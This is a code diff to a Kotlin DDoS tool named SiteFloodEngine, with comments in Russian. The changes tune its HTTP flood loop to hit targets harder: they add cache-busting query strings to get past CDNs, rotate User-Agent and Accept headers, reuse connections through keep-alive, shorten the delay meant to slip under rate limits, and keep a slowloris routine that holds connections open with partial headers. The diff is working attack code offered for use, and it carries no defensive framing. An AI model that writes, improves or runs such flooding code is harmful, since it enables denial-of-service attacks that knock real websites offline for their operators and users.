@@ -52,7 +52,6 @@ object SiteFloodEngine {
         }
     }
 
-    // обход CDN и кэшей: каждый запрос с уникальным query
     private fun bust(url: URL, random: Random): URL {
         val sep = if (url.query == null) "?" else "&"
         return URL(url.toString() + sep + "r=" + random.nextLong() + "&x=" + random.nextInt(999999))
@@ -71,26 +70,27 @@ object SiteFloodEngine {
                 conn.setRequestProperty("User-Agent", userAgents[random.nextInt(userAgents.size)])
                 conn.setRequestProperty("Accept", accepts[random.nextInt(accepts.size)])
                 conn.setRequestProperty("Accept-Language", langs[random.nextInt(langs.size)])
+                conn.setRequestProperty("Accept-Encoding", "gzip")
                 conn.setRequestProperty("Cache-Control", "no-cache")
-                conn.setRequestProperty("Connection", "close")
                 conn.responseCode
+                // читаем кусок и закрываем ТОЛЬКО поток: соединение уходит в keep-alive пул
+                val stream = try { conn.inputStream } catch (e: Exception) { conn.errorStream }
+                try { stream?.read(ByteArray(512)) } catch (e: Exception) {}
+                try { stream?.close() } catch (e: Exception) {}
                 localCount++
                 if (localCount >= 100) {
                     requestCount.addAndGet(localCount)
                     localCount = 0L
                 }
-                // джиттер против примитивных rate-limit
-                delay(random.nextLong(0, 15))
+                delay(random.nextLong(0, 10))
             } catch (e: Exception) {
+                try { conn?.disconnect() } catch (e: Exception) {}
                 delay(50)
-            } finally {
-                conn?.disconnect()
             }
         }
         requestCount.addAndGet(localCount)
     }
 
-    // slowloris: держит соединения открытыми частичными заголовками
     private suspend fun slowLoop(base: URL, random: Random) {
         val host = base.host
         val port = if (base.port != -1) base.port else if (base.protocol == "https") 443 else 80
